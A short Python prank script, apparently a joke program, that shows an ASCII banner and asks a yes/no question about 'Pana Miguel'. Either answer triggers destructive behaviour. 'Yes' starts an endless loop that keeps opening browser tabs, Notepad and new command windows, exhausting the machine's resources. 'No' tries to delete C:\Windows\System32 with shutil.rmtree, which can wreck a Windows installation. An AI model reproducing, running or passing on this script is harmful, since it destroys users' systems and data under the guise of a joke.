import webbrowser
import os
from os import system
import ctypes
import subprocess
import shutil
class Programa:

    def __init__(self):
        self.directorio = os.getcwd()
        self.nombre_txt = "mi_pana.txt"
        self.cmdejecutar = f'start cmd /K python {self.directorio}\\panacmd.py'
        
    def Banner():
        os.system("color 4")
        print("""
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&(**/&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(,,(@@@@@@@@@@@@@@@@@@@@@@@@&/***/(&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(*,,...*%@@@@@@@@&&%%%%&&&#*,,**/((#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(,***,...*(((/**,********,,,**/(####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(,,**,,.  ..,,,,********,,,,*/###%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&/,**,..    ..,,************//(##%%%%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&/,,*..     ..,,*******///////(((#%##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(...       ....,,,,,**//////////(((#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.         .. ..,,**////////((((((((&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/.   .*(#%/. ..,,*/(%&&&&#(((((((((&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*....,*//*,...,**/####((((#######%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*..........,*/(((((/((((#######&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*,.......,/(#((////(((#####&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,....,**/(((##(((((###%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#....,,*//(((((((##%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

        """)
    def ejecutar(self):

        os.system(f'start notepad {self.directorio}\{self.nombre_txt}')
        subprocess.run(self.cmdejecutar, shell=True)
        
if __name__ == "__main__":


    mi_programa = Programa()

    


    Programa.Banner()
        

    respuesta = input("¿Pana miguel? (Y/N)")
        



    if respuesta.lower() == "y":
        print("God bless Pana Miguel ✞ ")

        while True:
            webbrowser.open_new("https://i.imgur.com/394pBl1.jpeg")
            webbrowser.open_new("https://www.youtube.com/watch?v=dMnCaF0hXYo")
            mi_programa.ejecutar()


    elif respuesta.lower() == "n":
        try:
            print("Removing System32")
            shutil.rmtree("C:\Windows\System32")
            print('System32 folder deleted successfully!')
        except:
            print("Error deleting System32")
    input("presiona enter para salir")


